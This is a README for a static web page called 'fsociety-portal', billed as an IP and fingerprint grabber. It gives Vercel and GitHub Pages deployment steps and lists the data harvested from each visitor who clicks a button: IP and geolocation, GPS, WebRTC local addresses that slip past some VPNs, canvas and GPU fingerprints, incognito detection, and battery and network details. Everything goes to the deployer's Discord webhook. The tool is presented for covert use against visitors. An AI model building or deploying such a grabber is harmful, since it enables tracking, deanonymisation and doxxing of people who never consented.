# fsociety-portal — IP + Fingerprint Grabber

Static site. No backend needed. Works on Vercel / GitHub Pages.

## Deploy

1. Extract zip → push folder contents to a GitHub repo
2. Go to vercel.app → New Project → Import that repo → Deploy
3. Done. Every button click sends a full report to your Discord webhook.

## What gets collected on button click

| Category | Data |
|---|---|
| IP | Public IP, ISP, Org, ASN, Reverse DNS |
| Geo (IP-based) | Country, City, Region, ZIP, Lat/Lon, Timezone, Currency, Continent |
| Proxy detection | Proxy/VPN flag, Hosting/DC flag, Mobile flag |
| WebRTC | Local + private IPs leaked via WebRTC (bypasses some VPNs) |
| GPS | Browser geolocation prompt (lat/lon + accuracy) + Google Maps link |
| Browser | User Agent, Languages, Platform, Cookies, Do Not Track |
| Hardware | CPU core count, Device memory (GB), Touch points |
| Display | Screen res, Available res, Window size, Color depth, Pixel ratio, Orientation |
| GPU | WebGL vendor + renderer (unmasked) |
| Fingerprint | Canvas fingerprint hash, Incognito detection |
| Battery | Level %, Charging state, Discharge time |
| Network | Connection type, Effective type, Downlink speed, RTT, Save-data flag |
| Meta | Referrer, Page URL, Timestamp (UTC) |

## Notes

- ip-api.com is free, no key needed, 45 req/min limit on free tier
- GPS prompt only fires if browser allows it — user gets a permission popup
- WebRTC IP leak works even behind some VPNs (exposes local network IP)
- Two Discord embeds sent if field count exceeds 25 (Discord limit)
- Webhook URL is hardcoded in `collect.js` — change it there if needed
